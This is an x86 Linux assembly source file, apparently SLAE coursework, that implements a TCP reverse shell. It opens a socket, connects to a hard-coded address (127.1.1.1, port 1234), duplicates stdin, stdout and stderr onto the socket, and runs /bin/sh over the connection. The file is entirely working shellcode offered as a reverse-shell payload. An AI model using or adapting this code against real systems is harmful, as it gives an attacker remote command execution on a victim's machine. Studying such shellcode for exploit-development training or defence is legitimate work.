
    ; Filename:  reverse_shell_tcp.nasm
    ; Author:    Ahmed Kasmani
    ; StudentID: SLAE-1133
    ; Purpose:   TCP Reverse Shell


    global _start

    section .text
    _start:
        ; creating the socket
        xor ebx, ebx
        mov bl, 0x02

        xor ecx, ecx
        mov cl, 0x01

        xor edx, edx

        xor eax, eax
        mov ax, 0x167
        int 0x80

        ; connecting
        xor ebx, ebx
        mov ebx, eax

        push dword 0x0101017f
        push word 0xd204
        push word 0x02

        xor ecx, ecx
        mov ecx, esp

        xor edx, edx
        mov dl, 0x10

        xor eax, eax
        mov ax, 0x16A
        int 0x80

        ; dup2 3 times
        ; 1st time dup2 for STDIN_FILENO
        ; mov ebx, eax
        ; #define STDIN_FILENO	0
        xor ecx, ecx

        xor eax, eax
        mov al, 0x3F
        int 0x80


        ; 2nd time dup2 for STDOUT_FILENO
        mov cl, 0x1

        xor eax, eax
        mov al, 0x3F
        int 0x80


        ; 3rd time dup2 for STDERR_FILENO
        mov cl, 0x2

        xor eax, eax
        mov al, 0x3F
        int 0x80



        ; this is the execve part

        xor eax, eax
        xor ebx, ebx

        ; push 0x00000000 to stack
        push ebx
        ; mov the above 0 to edx, the last param of execve
        mov edx, esp

        ; push //bin/sh to the stack, moving it to ebx
        push 0x68732f6e
        push 0x69622f2f
        mov ebx, esp


        xor ecx, ecx
        push ecx
        push ebx
        mov ecx, esp


        mov al, 0xb
        int 0x80

    